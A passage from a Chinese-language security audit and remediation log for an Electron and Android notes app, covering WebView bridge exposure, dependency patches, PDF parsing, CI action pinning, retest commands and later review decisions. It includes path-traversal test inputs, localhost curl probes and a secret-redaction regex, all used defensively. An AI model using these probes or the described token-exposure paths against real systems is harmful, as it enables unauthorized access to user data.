无论哪条：把注释改为"这是**发布**配置"并加 CI 断言脚本（见 §5）。
- **成本**：S
- **状态**：新发现（注释自称"开发版"，实际进发布包）→ **261029 复核：不做**（注释已修正为「发布配置」，判断见 §6）

### SEC-09 [P2] Android WebView JS 桥全生命周期可用 + `data:/blob:` 内导航放行

- **证据**
  - `MainActivity.kt`（工作树版本）：`addJavascriptInterface(LaunchUrlInterface(…), "lakeLaunchUrl")`、`AssetTokenInterface`（`getToken()`）、`SystemBarsInterface`、`DeviceInterface`、`InsetsInterface`、`BootInterface`，**一次注入、从不移除**；`node_modules/@capacitor/android/…/MessageHandler.java:38` 另有 `webView.addJavascriptInterface(this, "androidBridge")`。
  - `Bridge.java: launchIntent`：`if (url.getScheme().equals("data") || url.getScheme().equals("blob")) return false;` —— 这两类 URL **不拦**，由 WebView 自行导航（其它 scheme 一律 ACTION_VIEW + return true 拦掉）。
- **影响**：`addJavascriptInterface` 的安全前提是"WebView 只加载可信页面"。当前链路里外链已被 Capacitor 拦去系统浏览器、`javascript:` 会被当 scheme 拦截，故**可达性受限**（data: 顶层导航被 Chromium 自身拒绝、blob: 需同源脚本先创建），属纵深防御缺口而非可直接利用链。但一旦未来新增"预览网页/打开 HTML 附件"等功能，`lakeAssetToken.getToken()` 与 `androidBridge` 会直接交出资产 token 与全部插件能力（`BodyStore.read("metadata.sqlite3")` / `SecureStore.get("s3.secretAccessKey")` 足够拿全库）。
- **建议**：① 激进：给主 WebView 加显式 `shouldOverrideUrlLoading` 白名单（只允许 `http://localhost*`），`onPageStarted` 校验 `view.url` 不在白名单时 `loadUrl(appUrl)` + removeJavascriptInterface 兜底；删掉 `data:/blob:` 放行分支（本项目无"在 WebView 内打开 data/blob 文档"需求，PDF 走 asset server）。② 保守：给 `AssetTokenInterface.getToken()` 加运行期判定"仅当 `webView.url` 以 http://localhost 开头才返回 token"，并在 MainActivity 注释写明安全前提。
- **成本**：S（保守 ~10 行）/ M（激进需设备回归导航/附件/PDF/分享）
- **状态**：新发现

### SEC-10 [P2] 补丁面与文档漂移：3 个 patch、两个目录、打在构建产物上；AGENTS 只承认 1 个

- **证据**
  - `package.json: postinstall`：`patch-package --patch-dir vendor/lakex-doc-react/patches && patch-package --patch-dir patches`。
  - 实际补丁：`patches/@univerjs+ui+1.0.3.patch`（已文档化）、**`patches/@plait+draw+0.93.4.patch`（22.8KB，箭头线自动闭合）**、`vendor/lakex-doc-react/patches/@xiangfa+mindmap+0.7.1.patch`（2.4KB）。
  - `AGENTS.md` §2：「对 Univer 只有**一处**补丁 … **除它之外不要再给依赖打 patch**」——与仓库现状不符。
  - 补丁目标是 `node_modules/@plait/draw/fesm2022/plait-draw.mjs` 与 `univer/lib/es/index.js`（构建产物），无 hash/manifest 复核。
- **影响**：① 供应链可复现性：`npm ci` 后打补丁**无校验**，改了 patch 文件即可让构建产物带任意代码，review 面（22KB 压缩后的 bundle diff）几乎不可读；② 文档失真会让后来人（含 AI 会话）按"只有一处补丁"决策，升级依赖时漏测两处；③ 三处都是"改第三方构建产物"，任一依赖小版本变化即静默失效（patch 失败会让 npm ci 红，但"打上了、语义没生效"不会红）。
- **建议**：① 激进：把 `@plait/draw` 箭头线改动改为**应用层实现**（wrap 既有 withArrowLineAutoComplete / 注册自定义 reaction，23KB 改动集中在这一个插件）并删补丁；`@xiangfa/mindmap` 若也是小改同样上移，最后只剩 Univer 一处，把 AGENTS §2 与代码对齐。② 保守：更新 AGENTS §2 + 在 `patches/README`（或 LOCAL-CHANGES）列三处补丁的"为什么/影响面/升级怎么验"，并给 `postinstall` 加"补丁后断言"（每处 grep 一个 marker，失败 exit 1）。
- **成本**：S（② 文档 + 断言）/ L（① 应用层重实现）
- **状态**：新发现（文档 vs 实现漂移）

### SEC-11 [P2] `plugins: true`（Chromium PDF 插件）+ `object-src http://127.0.0.1:*`：PDF 成为唯一"被执行的第三方解析器"

- **证据**：`electron/main.ts: webPreferences.plugins = true`（注释：PDF 内联预览需要）；两个 CSP 都放行 `object-src http://127.0.0.1:*`；`MIME_BY_EXT` 把 `.pdf` 映射为 `application/pdf` ⇒ 任意来源（含他端同步/导入）的 PDF 会被 PDFium 解析。
- **影响**：PDFium 是 Chromium 历史 CVE 高发组件；在"恶意文档"威胁模型里 PDF 是唯一交给第三方原生解析器的不可信输入。缓解现状：PDF 由 Chromium 内置查看器在**渲染进程**内解析（Electron 没有额外的独立插件沙箱），渲染进程自身 `sandbox: true` 把"被内存破坏"的后果限制在该进程内；不影响"不可信 PDF 是最高价值攻击输入"这一判断。
- **建议**：① 激进：PDF 预览改**外部应用打开**（已有 `open_attachment` 通道）或"先转图片再内联"（已有 pdfText/sharp 能力），关掉 `plugins: true`；② 保守：保留但在文档与代码注释登记"PDF 是可信边界外的解析器"，并在 `docs/RELEASE.md` 的升级检查项里加"PDFium 安全公告"；`object-src` 收成 `127.0.0.1:19876`（与 SEC-05 同批）。
- **成本**：M（① 体验退化需产品确认）/ S（② 文档 + CSP 收窄）
- **状态**：新发现（属"接受并登记"型风险）

### SEC-12 [P2] CI 供应链：mutable tag 的 action、第三方 release action 持 `contents: write`、Gitee token 走命令行参数

- **证据**
  - `.github/workflows/release.yml`：`actions/checkout@v4`、`actions/setup-node@v4`、`actions/upload-artifact@v4`、`actions/setup-java@v4`、`softprops/action-gh-release@v2`（第三方，`permissions: contents: write`）；`GITEE_TOKEN` 通过 `-d "access_token=$GITEE_TOKEN"` 传 curl（出现在 runner 进程参数里）。
  - `packaged-smoke.yml` 在 `pull_request` 上 npm ci + 跑 `scripts/ci-packaged-smoke.sh`（会 build + 启动打包产物）——fork PR 无 secrets 可用，故无凭据外泄；但会在 runner 上执行不可信代码（CI 常规代价），且**无 `pull_request_target`**（好事）。
  - `on: push: tags: ["v*"]` —— 只有写权限才能推 tag，输入面可控。
- **影响**：action 的 major tag 可被上游重写（供应链投毒标准面）；`softprops/action-gh-release` 在 `contents: write` 下若被投毒可直接改 release 产物。个人项目实际风险低，但发布流水线是唯一能影响所有用户机器的环节。
- **建议**：① 激进：全部 action pin 到 **commit SHA**；release action 换官方 `gh release upload` 或 pin SHA；GITEE_TOKEN 改走 header/`env` 文件（避免出现在 argv）；release job 加 `environment:` 保护。② 保守：只 pin `softprops/action-gh-release` + 去掉 `-d access_token` 的 argv 形态。
- **成本**：S
- **状态**：新发现

### SEC-13 [P2] 纵深防御小项（逐条给最小修法）

| # | 证据 | 影响 | 建议（最小） |
|---|---|---|---|
| 13a | `electron/s3v3/desktopStoreAdapter.ts: writeQuickAsset` 不校验 filename（同文件 `writeAsset` 用 `SAFE_ASSET_FILENAME`）；上游 `validateAssetDeclaration` 已校验 | 依赖上游正确性；单点回归即可打开任意写 | 两行：`writeQuickAsset` 加同一个 `SAFE_ASSET_FILENAME.test` 断言 |
| 13b | `src/mobile/native/secretStore.ts`（固定派生密钥 + localStorage 密文）会被打进**发布 APK**（`mobileSecretStore` 运行时三元分支） | 包内存在"固定密钥可解"的路径；历史值残留或未来误用即等同明文 | 构建期消除：改静态分支 + 从 mobile bundle tree-shake 掉 `localStorageSecretStore`（保留给 web 预览入口） |
| 13c | `android/.../AiChatPlugin.kt: getSettings` 返回 `keyTail`（`sk-****` + 末 4 位） | 末 4 位进 JS/DOM/日志（docstring 自己写"JS 永远拿不到明文，只回尾号"——**这是有意的**） | 若要更严：只回 `hasKey:true`；否则在 HANDOFF/代码注释承认"末 4 位可见" |
| 13d | `android/app/src/main/res/xml/config.xml`（Cordova 残留 `<access origin="*" />`）+ 仓库无任何代码引用 | 误导性死配置（Capacitor 不读），后来人可能按它理解网络策略 | **改判（261028）：无可删对象**——该文件由 `cap sync` 生成且未被 git 跟踪（见 §3 D-2）；只需不按它理解网络策略 |
| 13e | `electron/ipc/registerLogIpc.ts` 把日志尾部（含 URL、绝对路径、IPC 名）交渲染层；`main.ts` 把渲染层 console 全量转发落盘 | 日志内容 = 信任面；W-14 只处理 S3 secret 一个点，靠"约定不打印正文"兜底（`docs/LOGGING.md:45`） | 加极小的 `redactLogLine()`（屏蔽 `token=…`/`access_token`/`Bearer …`/`sk-[A-Za-z0-9]{8,}`）挂在 logger 的 console 桥与 console-message 转发处 |
| 13f | 资产服务 `Cache-Control: public, max-age=31536000, immutable` | `public` 语义在共享缓存/profile 下会跨用户复用；单用户无害 | 改 `private, max-age=31536000, immutable`（一行，行为不变） |

---

## 3. 删除 / 合并清单（可安全去除，逐条给证据与风险）

| # | 对象 | 证据 | 风险 | 处置 |
|---|---|---|---|---|
| D-1 | ~~浏览器端整套~~ **改判（用户 261028 裁决）**：浏览器端**保留并完善**——桌面上有真实用途（浏览器分屏读笔记），仅桌面端、移动端不做；原「建议删/只读化」作废 | 保留后安全面必须长期维护（SEC-07 token 下发、SEC-04 资产 token、SEC-05 CSP 端口都从"可随删除消失"变成"必须修"） | 删了会丢用户的真实用法 | **不删**；按 `11-browser-end-plan.md` P0 做安全收口（SEC-07 + Origin/WS 校验 + 下载端点鉴权） |
| D-2 | ~~`android/app/src/main/res/xml/config.xml`~~ | **改判（261028 实施时核实）**：该文件**未被 git 跟踪**（`android/.gitignore` 标为 Generated Config files），内容由 `cap sync` 每次重写 ⇒「删仓库文件」是 no-op，cap sync 会再生。真正可动的只有 `capacitor.config.ts` 的 `cordova.accessOrigins`，且 Capacitor 运行时不读。 | 无 | **不删**（改判：无可删对象） |
| D-3 | `preload.cjs` 的 `assetPort` / `assetToken` 双暴露 | 桌面渲染层需要 token 才能取图（`src/lib/assetPort.ts`）；preload 只注入到本应用窗口 | 删了取不到图 | **不删**，文档化"token 只给本应用页面" |
| D-4 | `show_attachment_in_folder` / `copy_asset_path` / `reveal_note_file` / `open_note_assets`（4 个"把本机路径交给用户"的通道） | 都只接受合法段/固定白名单 kind，只做 reveal | 删了丢功能（用户在用"在文件夹中显示"） | **不删**；`copy_asset_path` 把绝对路径写系统剪贴板（任何 app 可读）⇒ 改为复制相对文件名或加确认（S） |
| D-5 | `get_note_paths` 回传绝对路径 | `src/hooks/useNoteActions.ts:93` 使用（属性面板展示 + 定位） | 无安全实质（用户自己的机器） | 保留；要收敛就把属性面板改为只显示目录名 |
| D-6 | 迁移码 `LLN1` 的导出入口 | 固定种子（**已定稿，不重提**） | — | **不动**；保留"别外传"提示 |
| D-7 | AI 设置里的"草稿测试"路径 | 见 SEC-01 | 删掉会少"先测再存"便利 | 按 SEC-01 ① 收敛（不删功能，只禁"复用已存 Key + 任意 baseUrl"组合） |
| D-8 | `vendor/lakex-doc-react/patches/@xiangfa+mindmap+0.7.1.patch` | 需先读内容判断能否上移（本轮未展开） | 上移失败会让思维导图退化 | 列为待评估（**不是**"直接删"） |

**合并建议（真问题，不是"更优雅"）**
1. **origin 白名单要单一来源**：`assetServer.isAllowedOrigin` 里手写了 `1421/19880/file:///null` 四个来源，而 `DEV_SERVER_URL` 可被 `LAKE_DEV_SERVER_URL` 覆盖 ⇒ 已经存在"dev 端口改了、白名单没改"的漂移面。应从 `appOrigin.ts` + 一个 `devOrigin()` 常量派生（不是新抽象，是把已有常量用起来）。
2. **响应安全头的跨端一致性用测试向量而不是注释**：`assetServer.ts` 与 `AssetServer.kt` 各写一份 nosniff/SVG CSP/Content-Disposition，注释要求"逐字节一致"。跨语言无法共享代码 ⇒ 共享**夹具 JSON**（恶意附件/HTML/SVG 的期望响应头），两侧单测各自读（S 成本，防"只改一端"）。

---

## 4. 重构路线（分阶段，标明依赖与门禁）

> 原则：先收"凭据与出网目标"（P1，接口面最小），再收"平台/产物"（P1/P2，CI 与 gradle），最后做"面收窄"（D-1/D-2/D-8 这类删除）。每阶段可独立合并、独立回滚。

| 阶段 | 内容 | 依赖 | 门禁 |
|---|---|---|---|
| **S0 止血（P1，约 1 天）** | SEC-01（禁止"草稿 baseUrl + 已存 Key"组合；baseUrl 强制 https/白名单）+ SEC-02（保存前 validateS3Settings + endpoint 变更警告） | 无 | tsc；新增 `aiDraftKeyLeak.test.ts`（换 baseUrl 且不带 Key ⇒ 拒绝）、`s3SettingsEndpoint.test.ts`（http/非法 URL 保存被拒）；手点一次"设置 → 同步/测试连通" |
| **S1 平台与产物（P1/P2，1–2 天）** | SEC-03（Android release 变体 + debug keystore 签、去 debuggable；CI 硬门禁或产物隔离；桌面加 SHA-256 清单）+ SEC-06（permission handler 全拒）+ SEC-08（NSC 收窄到 localhost；cleartext 只 debug） | 与 S0 无关；Android 侧只要能跑一次 `./gradlew assembleRelease` | `assembleRelease` 通过 + `aapt dump badging` 断言 `debuggable=false`；桌面 3 处权限回归（PDF/音视频/复制图片）；APK 装机冒烟 |
| **S2 面收窄（P2，2–3 天）** | SEC-04（token 全请求强制）+ SEC-05（CSP 端口收窄）+ SEC-07（与 01 的 D-1 合并：删或只读化） | 04/05 互相独立；07 依赖 01 的产品结论 | 资产服务凭证矩阵（Origin×token×穿越×SVG×HTML×Range）；设备 6 态快照 + PDF/音视频/缩略图点测；CSP 负向探针（fetch 19877 被拦） |
| **S3 清理（P2，约半天）** | D-2 删 `config.xml`；SEC-10 文档对齐 + `postinstall` 补丁断言；SEC-12 pin action；SEC-13a/13f 各一行 | 可与任意阶段并行 | `npm ci` 重跑一次（补丁断言）；git diff 复核 |
| **S4 可选（评估）** | SEC-09（Android 导航白名单 + 桥移除兜底）、SEC-10①（plait 补丁上移）、SEC-11（PDF 去插件化）、D-8 | S2 之后（避免同时改 WebView 面） | 设备走查 22 屏 + 附件/PDF/分享/深链回归 |

**不做**（明确记录，避免下轮重提）：改 vendor 内核、删依赖侧死代码、为安全重构同步协议、加 WAF/运行时防护这类"防御式增层"。

---

## 5. 度量与复测方法（以后怎么证明改好了）

### 5.1 可自动化的"安全度量"（建议入库）

| 指标 | 目标 | 现成挂载点 |
|---|---|---|
| **IPC 通道 × 非法来源** 覆盖 | 100% 通道在"非 trusted sender"下抛 `IPC 调用来源不受信任` | `electron/ipc/ipcChannelParity.test.ts` 已有全通道清单，扩成矩阵：遍历 `registry.keys()`，用伪造 event 断言 `validateSender` 被调 |
| **IPC 通道 × 入参类型** 覆盖率 | 所有接收 string/对象的通道都有一个 `INVALID_INPUT` 用例 | 同上矩阵加一列 badArgs |
| **路径穿越** 负向用例 | `..`、`..`+反斜杠、绝对路径、`%2e%2e`、`.`、超长段 全被拒 | `electron/store.test.ts` + `assetServer.test.ts` |
| **CSP 断言** | ① prod 不含 unsafe-inline/unsafe-eval；② inline script hash = 内容 sha256（本审计手工验过，应自动化）；③ 允许 origin 清单 = {self, data:, blob:, 127.0.0.1:<ASSET_PORT>} | 新建 `scripts/security/csp-contract.mjs`（读 `vite.config.ts` 常量 + 重算 hash） |
| **Android 清单断言** | allowBackup=false、exported 只在 MainActivity/alias、FileProvider exported=false 且 paths ⊆ note-assets/、NSC 不含 base-config cleartext、release 变体 debuggable=false | 新建 `scripts/security/android-manifest-check.mjs`（读 XML / merged manifest，或 `aapt dump badging`），挂 CI |
| **资产服务凭证矩阵** | 8 种组合（Origin 有/无 × token 有/无 × vendor/note 路径 × 穿越）全部给期望 | `electron/assetServer.test.ts` 已起真 server（285 行），扩用例即可；Android 侧 `AssetServerTest`（JVM 单测，`securityHeaderLines` 已包级可见，说明已有测试结构） |
| **ai/s3 参数回归** | 草稿换 baseUrl 不带 Key ⇒ 拒绝；http/非法 endpoint ⇒ 保存被拒；endpoint 变更 ⇒ 有日志/警告 | 新增 2 个单测（见 §4 S0） |
| **补丁完整性** | 每个 patch 打完后 marker 存在 | 新建 `scripts/security/patch-assert.mjs`，挂 `postinstall` 尾部 |

### 5.2 一次性复测命令（写进 PR 描述即可）

```bash
export PATH="$HOME/.nvm/versions/node/v24.18.0/bin:$PATH"
cd /Users/admin/file/local-lake/lakex-local-notes
npx tsc --noEmit && npx vitest run electron/assetServer.test.ts electron/webApiServer.test.ts electron/ssrf.test.ts \
  electron/httpFetcher.test.ts electron/appOrigin.test.ts electron/attachmentOpen.test.ts \
  electron/ipc/ipcChannelParity.test.ts electron/ipc/registerSystemInfo.test.ts
node scripts/security/android-manifest-check.mjs   # 新增
node scripts/security/csp-contract.mjs             # 新增
bash scripts/ci-packaged-smoke.sh                  # 打包产物可启动（改 electron 主进程时必跑）
```
运行态取证（仅隔离实例，遵守 AGENTS §7：`LAKE_USER_DATA=$TMPDIR/...` + 专用 CDP 端口）：
1. 渲染层 fetch `http://127.0.0.1:19877` → 应被 CSP 拦（SEC-05 修好后）。
2. `curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:19876/<noteId>/<file>` → 期望 403（SEC-04 修好后）。
3. `curl -s -H 'Sec-Fetch-Site: none' http://127.0.0.1:19880/__native.js` → 期望 403（SEC-07 修好后）。

### 5.3 验收判据（防"改完又回去"）

1. **红线写成测试**：IPC 来源矩阵、CSP 契约、Android 清单断言三条**必须进 CI 门禁**（失败即红），其余为"改了相关层才跑"。
2. **文档口径与代码对齐**：`AGENTS.md` §2 的"唯一补丁"必须被 `patch-assert` 或清单测试反证；否则删掉断言式表述，改为指向 `patches/` 目录。
3. **每个 P1 修完留一条负向用例**（修之前红、修之后绿），并在 `docs/HANDOFF.md` §0 记一行；本文不重复登记 backlog。
---

## 修复状态（261028，见 `08-ab-execution.md`）

> 261028 晚复核：状态以**工作树代码**为准（逐条 grep）；与 `08` 轮次冲突处以代码为准并注明。
> 采样 = 2026-10-28 21:15–21:30（Asia/Shanghai）；完整逐条对账见 `13-audit-status.md` §1。

| 条目 | 状态 | 证据（文件 : 符号）与残余 |
|---|---|---|
| SEC-01 | ✅ 已修 | `src/core/aiProviders.ts: validateAiBaseUrl/aiBaseUrlChangeError`（L265/L296）+ `electron/ipc/registerAi.ts` L28/L45 草稿守门、L83 `ai_chat` 存量脏 baseUrl 二次校验（08 §8） |
| SEC-02 | ✅ 已修 | `electron/ipc/registerSync.ts` L15 import + L52 保存前 `validateS3Settings`；endpoint 变更记 warn |
| SEC-03 | ◐ 部分（本机 release 出包 + aapt + 装机已验证；真实 CI 首跑未做） | ① 静态断言：`scripts/check-android-release-config.mjs` 12 项 + `package.json` `check:android-release`；`.github/workflows/release.yml` android job 检查 step + `assembleRelease` + `aapt dump badging` 断言非 debuggable；**261029 用户裁决「放宽」**：release job 只以 `needs.macos.result == 'success'` 为前提（Android 失败只阻断自己的 APK）。② **本机 CI 等价出包（261029）**：`gradle assembleRelease` BUILD SUCCESSFUL（2m3s，251 tasks）→ `app-release.apk` 34,430,040B sha256 `d1eb2b91…470b20b9`；`aapt dump badging` 无 `application-debuggable`（xmltree 也无 debuggable 属性）、`apksigner` CN=Android Debug；`check-android-release-config --apk` 13/13 通过；③ **装机冒烟**：`adb install -r` 成功 → 启动渲染首页；`run-as` 返回 `package not debuggable`。**残余：真实 CI 首跑（冷缓存/runner SDK/aliyun 剔除/AGP 自动 debug keystore）**；桌面/Windows 签名按 `RELEASE.md` 决策暂不做 |
| SEC-04 | ⛔ 复核不做（261029） | 资产 token 仍只对带 Origin 请求生效；**261029 复核裁决不做**：同机进程可直接读明文数据目录，手机侧需已知 UUID+文件名且服务无目录枚举 ⇒ 边际收益≈0、重做双端资源链成本 M。见 §6 |
| SEC-05 | 🚫 已定不做（延期） | 条目头「261028 复核：已定不做」+ 08 §12；`vite.config.ts` CSP 恢复 `127.0.0.1:*` 通配并加注释（git 1ce3d3c2/4c2d2b49 既有决定）。**表不再记「未做」** |
| SEC-06 | ⛔ 复核不做（261029，且「全拒」有害） | 全拒会连 `navigator.clipboard.readText()`（S3 配置从剪贴板导入、多维表/卡片右键粘贴）一起拒掉；摄像头/麦克风/定位/通知全仓 0 调用方。见 §6 |
| SEC-07 | ✅ 已修 | `electron/webApiServer.ts` 头注释点名 SEC-07；`isAllowedRequest` L265（不再放行 `Sec-Fetch-Site: none`）+ 调用点 L688；`/__native.js` 不再下发 token（HttpOnly cookie）；单测 `webApiServer.test.ts` 25 例 |
| SEC-08 | ⛔ 复核不做（只修注释） | `cleartext: true` 保留：页面 scheme 本为 `http://localhost`，CSP 已把出网面限死（127.0.0.1:* + 七牛 https），S3 强制 https ⇒ 无可达目标；改成 `domain-config localhost` 需先把资产 URL 从 127.0.0.1 换成 localhost（风险>收益）。`network_security_config.xml` 旧注释自称「开发版」**已改为「发布配置」**。见 §6 |
| SEC-09 | ⛔ 复核不做（261029） | 当前无触发路径：移动端 CSP `script-src 'self'`+hash、`object-src 'none'`、外链被 Capacitor 拦去系统浏览器、`data:` 顶层导航被 Chromium 拒；新增 HTML/网页预览功能时按条目里的前置条件一起做（导航白名单）。见 §6 |
| SEC-10 | ✅ 已修（文档口径对齐） | AGENTS §2 已改为「**补丁面 = 3 处 / 两个目录**」并逐条登记作用/重建/升级验证：`patches/@univerjs+ui+1.0.3`、`patches/@plait+draw+0.93.4`、`vendor/lakex-doc-react/patches/@xiangfa+mindmap+0.7.1`；`package.json` postinstall 串两处 `patch-package`。残余（建议项，非本项判据）：未加「补丁是否命中」的 postinstall 断言 |
| SEC-11 | ⛔ 复核不做（接受并登记） | 内联 PDF 预览是用户真实功能，关 `plugins: true` = 功能倒退；PDFium 修跟随 Electron 升级、渲染进程 `sandbox: true` 限影响面。见 §6 |
| SEC-12 | ✅ 已修（261029） | 用户确认「后期确实要发版、走 GitHub Actions」⇒ 所有 action 钉**不可变 commit SHA**（checkout `11d5960`=v4.4.0 / setup-node `49933ea`=v4.4.0 / setup-java `cf277c6`=v4.9.1 / upload-artifact `ea165f8`=v4.6.2 / download-artifact `d3f86a1`=v4.3.0 / softprops/action-gh-release `3bb1273`=v2.6.2），workflow 头注释写明升级方式（换 SHA + 改注释版本）。Gitee token 仍走 Gitee API 的 `access_token` 形态（GitHub 托管 runner 单租户，且 action 已 pin ⇒ 残余面可接受） |
| SEC-13 | ✅ 已结（13a/13f 已修 + 测试；13b/13e 复核不做） | **13a 已修**：`electron/s3v3/desktopStoreAdapter.ts writeQuickAsset` 加 `SAFE_ASSET_FILENAME.test` 断言（注释点名 SEC-13a），负向测试 4 例（`electron/s3v3/desktopStoreAdapter.test.ts:259`「拒绝非法 filename」）；**13f 已修**：`electron/assetServer.ts` L269/366/377 三处 `public→private, max-age…, immutable` + 响应头断言（`electron/assetServer.test.ts:168/211/276`）。**261029 复核不做**：13b（固定派生密钥进发布 APK —— 真机路径不可达，能读 localStorage 的人本来就能读明文库/正文）、13e（日志 redact —— 日志里只会出现每次启动随机的资产 token）；13c 属**有意**（末 4 位可见，代码注释承认）；**13d 改判**（`config.xml` 由 `cap sync` 生成、未跟踪 ⇒ 无可删对象，见 §3） |
| D-2 | 🚫 改判（无可删对象） | `android/.../res/xml/config.xml` 由 `npx cap sync android` 生成且未纳入 git ⇒ 删无可删；本条只登记「不要按它理解网络策略」 |
---

## 6. 261029 复核裁决：剩余安全项逐条（**全部不做**）

> 口径（用户 261029 定）：**不为无法出现的场景写防御代码**；判断 =「这个威胁在本产品真实使用里能不能出现 → 出现后现有防线能不能兜住 → 成本与收益是否成比例」。
> 结论：剩余 SEC 项全部判为**不做**（含 SEC-13b/13e）；只顺手做两处**注释纠错**与一条发布正确性待办，不新增任何防御代码。

| 条目 | 裁决 | 功能/场景判断（为什么不做） |
|---|---|---|
| SEC-04 资产 token 只对带 Origin 请求生效 | **不做** | 桌面：同机进程要读附件，直接读数据目录里的明文正文/附件即可，token 只挡网页 ⇒ 边际收益 0。Android：其它 App 要读必须**先知道 UUID + 文件名**（服务端无目录枚举、路径段有校验），而能读到 App 数据的路子（root / 无障碍截屏 / 读明文 SQLite）本来就绕开这层。代价却是重做全部图片/PDF/音频/缩略图 URL 的双端链路 + 设备回归（M）。 |
| SEC-06 无 session 权限收敛 | **不做（且「全拒」有害）** | 我们**确实依赖默认放行**：`navigator.clipboard.readText()` 用于「S3 配置从剪贴板导入」「多维表/卡片右键粘贴」「粘贴导入」；按审计建议「全拒」会把这些功能一起拒掉。而摄像头/麦克风/定位/通知全仓 **0 调用方** ⇒ 全拒只能防「渲染层已被攻破」这一层，而第一层（文档里的脚本执行）已由 CSP（无 unsafe-inline、`script-src 'self'`）挡住。 |
| SEC-08 Android 全局 cleartext | **不做（只修注释）** | 页面 scheme 是 `http://localhost`（`capacitor.config.ts` **特意**把 Capacitor 默认的 https 改成 http，否则 `<audio>/<video>` 加载本地资源会被混合内容策略拒），页面出网面又被 CSP 限死在 `127.0.0.1:*` + 七牛 https，S3 保存强制 https ⇒ 全局 cleartext **没有可达目标**。改成 `domain-config localhost` 必须先把资产 URL 从 127.0.0.1 换成 localhost（NSC 不认 IP 字面量）⇒ 为配置好看去动加载链，风险>收益。 |
| SEC-09 WebView 桥全生命周期可用 | **不做** | 桥可用的前提是「WebView 里跑起了非本应用的文档脚本」：移动端 CSP `script-src 'self'`+hash、`object-src 'none'`、外链被 Capacitor 拦去系统浏览器、`data:` 顶层导航被 Chromium 自身拒绝 ⇒ **当前无触发路径**。真正会改变这个判断的是「在应用内预览 HTML/网页」——条目里已写成前置条件（那时连导航白名单一起做）。**HTML 附件已按「外部浏览器打开」落地（261029）**：外部打开不进入我们的 WebView/源，不触发本条；删 `data:/blob:` 分支反而可能弄坏内核内联图片/画板。 |
| SEC-11 PDF 走 PDFium | **不做（接受并登记）** | 内联预览 PDF 是用户真实在用的功能（收到的 PDF 直接看）；关 `plugins: true` 等于功能倒退。PDFium 的修复跟随 Electron 升级（我们 pin 44 并随升级带走），渲染进程 `sandbox: true` 把内存破坏的后果限制在该进程。威胁模型上「恶意 PDF 进到你的库里」通常已意味着对方能写你的同步数据。 |
| SEC-12 CI 供应链（mutable tag） | **已做（261029）** | 用户 261029 确认「后期确实要发版、调用的是 GitHub Actions 能力」⇒ 把 mutable major tag 换成**不可变 commit SHA**：防的是「上游 action 被重指/投毒」这条发布链路投毒面（我们的安装包本身不签名，一旦发布链路被改用户无法察觉）。实现 = 两个 workflow 全部 action 钉 SHA（行尾注释版本号）+ 头注释写升级方式；官方 action 的 SHA 维护成本接受（发版频率低）。Gitee token 形态不动（Gitee API 的 `access_token` 参数，托管 runner 单租户，残余面可接受）。 |
| SEC-13b 固定派生密钥进 APK | **不做** | 真机路径不可达（`keystoreAvailable()` 原生插件恒真），且能读到 WebView localStorage 的人（root/adb）本来就能直接读明文 SQLite 与正文文件 ⇒ 保护对象不存在；tree-shake 改造要碰移动打包，收益 0。 |
| SEC-13e 日志 redact token | **不做** | 日志里可能出现的只有**每次启动随机**的资产 token（只对本机当次会话有效）；S3 secret / AI key 从不进日志（掩码 + safeStorage + 不打印约定）。给「不可能泄露的凭据」写正则 = 过度防御。 |
| SEC-13c 只回 keyTail（末 4 位） | **保留（有意）** | 用途是「我配的是哪把钥匙」的识别；连末 4 位都不想露可以只回 `hasKey`，但那是产品口味、不是安全收益。 |

**顺带做完（不是新防御，是让文档不说假话）**
1. `android/app/src/main/res/xml/network_security_config.xml` 的注释从「开发版」改为「**发布**配置」并写明为什么只能是 base-config（旧注释会让人以为发布包另有一套配置）。
2. `vite.mobile.config.ts` 的 CSP 头注释原文写 `androidScheme=https`，实际是 `http`（CSP 里 `https://localhost` 只是历史兼容项）——安全推理依赖这类注释为真。

3. **HTML 附件改为可用系统默认浏览器打开（261029，功能项不是安全项）**：`isSafeShellOpenFilename` 显式放行 `html/htm`（**只**交给外部应用打开）；我们自己的源仍不提供 `text/html`（`MIME_BY_EXT` 无 html、资源服务未知扩展名一律 `octet-stream` + `nosniff`）⇒ 不会变成应用内脚本执行面；移动端 native 白名单（`OpenFilePlugin.isSafeShellOpenName`）暂不放开。判据：打开 HTML 附件 = 用户自己在 Finder 里双击一个 HTML，风险在浏览器/OS 侧，**不需要新增防御代码**。

**唯一还没验证过的真问题**：SEC-03 的**真实 CI 首跑**（决定用户下载到的是不是 debug 包）——属发布正确性，不需要新防御代码，需要在 GitHub runner 上跑一次 release job（冷缓存 / runner SDK / aliyun 剔除 / AGP 自动 debug keystore）。